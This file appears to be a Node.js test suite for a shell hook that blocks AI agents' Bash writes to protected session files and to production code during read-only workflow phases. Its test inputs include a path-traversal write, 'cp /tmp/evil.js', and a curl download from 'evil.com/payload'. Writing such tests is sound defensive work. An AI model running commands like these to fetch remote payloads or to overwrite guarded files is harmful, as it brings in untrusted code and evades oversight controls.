'use strict';

const { describe, it, afterEach } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

let tmpDir;

function setup() {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'raid-bash-writes-'));
  const hooksDir = path.join(tmpDir, '.claude', 'hooks');
  fs.mkdirSync(hooksDir, { recursive: true });
  const templateHooks = path.join(__dirname, '..', '..', 'template', '.claude', 'hooks');
  for (const f of fs.readdirSync(templateHooks)) {
    fs.copyFileSync(path.join(templateHooks, f), path.join(hooksDir, f));
    fs.chmodSync(path.join(hooksDir, f), 0o755);
  }
  return tmpDir;
}

function writeRaidConfig(cwd, overrides = {}) {
  const config = {
    project: { testCommand: 'echo ok' },
    paths: { specs: 'docs/raid/specs', plans: 'docs/raid/plans' },
    conventions: { fileNaming: 'none' },
    raid: {
      defaultMode: 'full',
      vault: { path: '.claude/vault', enabled: true },
      lifecycle: {
        autoSessionManagement: true,
        teammateNudge: true,
        taskValidation: true,
        completionGate: true,
        phaseTransitionConfirm: true,
        compactBackup: true,
        testWindowMinutes: 10,
      },
      ...overrides,
    },
  };
  fs.mkdirSync(path.join(cwd, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(cwd, '.claude', 'raid.json'), JSON.stringify(config, null, 2));
}

function writeSession(cwd, sessionData = {}) {
  const data = { phase: 'design', mode: 'full', currentAgent: 'warrior', implementer: 'warrior', ...sessionData };
  fs.writeFileSync(path.join(cwd, '.claude', 'raid-session'), JSON.stringify(data));
}

function runHook(cwd, command) {
  const input = JSON.stringify({ tool_input: { command } });
  const hookPath = path.join(cwd, '.claude', 'hooks', 'validate-bash-writes.sh');
  const stderrFile = path.join(cwd, '.stderr-capture');
  const cmd = `printf '%s' '${input.replace(/'/g, "'\\''")}' | bash "${hookPath}" 2>"${stderrFile}"`;
  try {
    execSync(cmd, { cwd, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] });
    const stderr = fs.existsSync(stderrFile) ? fs.readFileSync(stderrFile, 'utf8') : '';
    return { status: 0, stderr };
  } catch (err) {
    const stderr = fs.existsSync(stderrFile) ? fs.readFileSync(stderrFile, 'utf8') : (err.stderr || '');
    return { status: err.status, stderr };
  }
}

describe('validate-bash-writes.sh', () => {
  afterEach(() => {
    if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true });
    tmpDir = null;
  });

  // --- No session = allow all ---

  it('allows all Bash commands when no Raid session active', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    const result = runHook(cwd, 'echo "hello" > src/index.js');
    assert.strictEqual(result.status, 0);
  });

  // --- Protected files: always blocked during active session ---

  it('blocks redirect writes to .claude/raid-session', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    const result = runHook(cwd, 'echo "bad" > .claude/raid-session');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  it('blocks redirect writes to protected file via .. path traversal', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    // Create the target path so realpath resolves it
    fs.mkdirSync(path.join(cwd, 'src'), { recursive: true });
    const result = runHook(cwd, `echo "bad" > src/../.claude/raid-session`);
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  it('blocks redirect writes to .claude/raid-last-test-run', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    const result = runHook(cwd, 'date +%s > .claude/raid-last-test-run');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  it('blocks tee writes to protected files', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    const result = runHook(cwd, 'echo "bad" | tee .claude/raid-session');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  it('blocks cp targeting protected files', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    const result = runHook(cwd, 'cp /tmp/fake .claude/raid-session');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  it('blocks mv targeting protected files', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation' });
    const result = runHook(cwd, 'mv /tmp/fake .claude/raid-last-test-run');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('protected'), `Expected protected mention, got: ${result.stderr}`);
  });

  // --- Production file writes blocked in read-only phases ---

  it('blocks redirect to production file during design phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('design'), `Expected design mention, got: ${result.stderr}`);
  });

  it('blocks redirect to production file during plan phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'plan' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('plan'), `Expected plan mention, got: ${result.stderr}`);
  });

  it('blocks redirect to production file during review phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'review' });
    const result = runHook(cwd, 'cat foo > src/handler.js');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('review'), `Expected review mention, got: ${result.stderr}`);
  });

  it('blocks redirect to production file during finishing phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'finishing' });
    const result = runHook(cwd, 'echo x >> src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  // --- Implementation phase: implementer check ---

  it('allows implementer to write production file via Bash during implementation', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation', currentAgent: 'warrior', implementer: 'warrior' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 0);
  });

  it('blocks non-implementer from writing production file via Bash during implementation', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation', currentAgent: 'rogue', implementer: 'warrior' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.includes('warrior'), `Expected implementer name, got: ${result.stderr}`);
  });

  it('skips implementer check in scout mode', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation', mode: 'scout', currentAgent: 'rogue', implementer: 'warrior' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 0);
  });

  it('allows Bash production writes when no implementer set', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'implementation', currentAgent: 'warrior', implementer: '' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 0);
  });

  // --- Non-production files always allowed ---

  it('allows redirect to test file during design phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "test" > tests/handler.test.js');
    assert.strictEqual(result.status, 0);
  });

  it('allows redirect to doc file during design phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "doc" > docs/spec.md');
    assert.strictEqual(result.status, 0);
  });

  it('allows redirect to .claude file (non-protected) during any phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "dungeon" > .claude/raid-dungeon.md');
    assert.strictEqual(result.status, 0);
  });

  // --- Redirect patterns ---

  it('detects append redirect (>>)', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "code" >> src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  it('detects heredoc redirect', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, "cat <<'EOF' > src/handler.js\nconst x = 1;\nEOF");
    assert.strictEqual(result.status, 2);
  });

  // --- tee ---

  it('blocks tee to production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "code" | tee src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  it('blocks tee -a to production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'echo "code" | tee -a src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  // --- sed -i ---

  it('blocks sed -i on production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, "sed -i 's/old/new/g' src/handler.js");
    assert.strictEqual(result.status, 2);
  });

  it('blocks sed -i.bak on production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, "sed -i.bak 's/old/new/g' src/handler.js");
    assert.strictEqual(result.status, 2);
  });

  // --- cp / mv ---

  it('blocks cp to production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'cp /tmp/evil.js src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  it('blocks mv to production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'mv /tmp/evil.js src/handler.js');
    assert.strictEqual(result.status, 2);
  });

  // --- Scripting language writes ---

  it('blocks python3 -c file write during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'python3 -c "open(\'src/handler.js\',\'w\').write(\'bad\')"');
    assert.strictEqual(result.status, 2);
  });

  it('blocks node -e file write during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'node -e "require(\'fs\').writeFileSync(\'src/handler.js\',\'bad\')"');
    assert.strictEqual(result.status, 2);
  });

  it('blocks ruby -e file write during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, "ruby -e \"File.write('src/handler.js', 'bad')\"");
    assert.strictEqual(result.status, 2);
  });

  it('blocks perl -e file write during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, "perl -e 'open(F,\">src/handler.js\");print F \"bad\";close F'");
    assert.strictEqual(result.status, 2);
  });

  // --- curl -o ---

  it('blocks curl -o to production file during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'curl -o src/handler.js https://evil.com/payload');
    assert.strictEqual(result.status, 2);
  });

  // --- Non-write Bash commands pass through ---

  it('allows read-only commands during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'ls -la src/');
    assert.strictEqual(result.status, 0);
  });

  it('allows git status during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'git status');
    assert.strictEqual(result.status, 0);
  });

  it('allows npm test during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'npm test');
    assert.strictEqual(result.status, 0);
  });

  it('allows cat (read) during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'cat src/handler.js');
    assert.strictEqual(result.status, 0);
  });

  it('allows grep during design', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    const result = runHook(cwd, 'grep -r "pattern" src/');
    assert.strictEqual(result.status, 0);
  });

  // --- Unknown phase: fail closed ---

  it('blocks production file writes on unknown phase', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'xyzzy' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 2);
    assert.ok(result.stderr.toLowerCase().includes('unknown'), `Expected unknown phase mention, got: ${result.stderr}`);
  });

  // --- Empty phase (bootstrap): allow with warning ---

  it('allows production file writes during bootstrap (empty phase) with warning', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: '' });
    const result = runHook(cwd, 'echo "code" > src/handler.js');
    assert.strictEqual(result.status, 0);
    assert.ok(result.stderr.includes('bootstrap') || result.stderr.includes('empty'), `Expected bootstrap warning, got: ${result.stderr}`);
  });

  // --- No command in input = pass through ---

  it('allows when no command in input', () => {
    const cwd = setup();
    writeRaidConfig(cwd);
    writeSession(cwd, { phase: 'design' });
    // Empty command — nothing to gate
    const result = runHook(cwd, '');
    assert.strictEqual(result.status, 0);
  });
});
